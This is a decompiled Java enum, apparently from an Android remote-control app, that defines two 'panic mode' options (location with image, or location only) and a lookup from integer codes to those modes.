package com.vvt.remotecontrol.input;

import java.util.HashMap;
import java.util.Map;

public enum RmtCtrlInputPanicMode$Mode
{
  private static final Map a;
  private final int number;
  
  static
  {
    int i = 2;
    int j = 1;
    int k = 0;
    Object localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputPanicMode$Mode;
    ((Mode)localObject1).<init>("LOCATION_AND_IMAGE", 0, j);
    LOCATION_AND_IMAGE = (Mode)localObject1;
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputPanicMode$Mode;
    ((Mode)localObject1).<init>("LOCATION_ONLY", j, i);
    LOCATION_ONLY = (Mode)localObject1;
    localObject1 = new Mode[i];
    Mode localMode = LOCATION_AND_IMAGE;
    localObject1[0] = localMode;
    localMode = LOCATION_ONLY;
    localObject1[j] = localMode;
    b = (Mode[])localObject1;
    localObject1 = new java/util/HashMap;
    ((HashMap)localObject1).<init>();
    a = (Map)localObject1;
    localObject1 = values();
    int m = localObject1.length;
    while (k < m)
    {
      Object localObject2 = localObject1[k];
      Map localMap = a;
      int n = ((Mode)localObject2).number;
      Integer localInteger = Integer.valueOf(n);
      localMap.put(localInteger, localObject2);
      k += 1;
    }
  }
  
  private RmtCtrlInputPanicMode$Mode(int paramInt1)
  {
    this.number = paramInt1;
  }
  
  public static Mode forValue(int paramInt)
  {
    Map localMap = a;
    Integer localInteger = Integer.valueOf(paramInt);
    return (Mode)localMap.get(localInteger);
  }
  
  public int getNumber()
  {
    return this.number;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputPanicMode$Mode.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */